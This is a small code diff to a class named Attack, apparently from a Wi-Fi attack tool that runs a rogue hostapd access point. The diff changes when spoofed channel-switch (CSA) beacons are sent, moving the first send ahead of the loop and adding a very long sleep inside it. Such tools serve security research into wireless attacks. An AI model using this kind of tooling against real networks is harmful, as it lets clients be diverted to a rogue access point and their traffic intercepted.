@@ -346,10 +346,13 @@ class Attack():
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		flag_while = 1
+		time.sleep(10)
+		self.send_csa_beacon(numbeacons=4)
 		while(True):
-			time.sleep(10)
-			self.send_csa_beacon(numbeacons=4)
+			
 			flag_while += 5
+			time.sleep(1000000)
+			self.send_csa_beacon(numbeacons=4)
 			
 
 	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
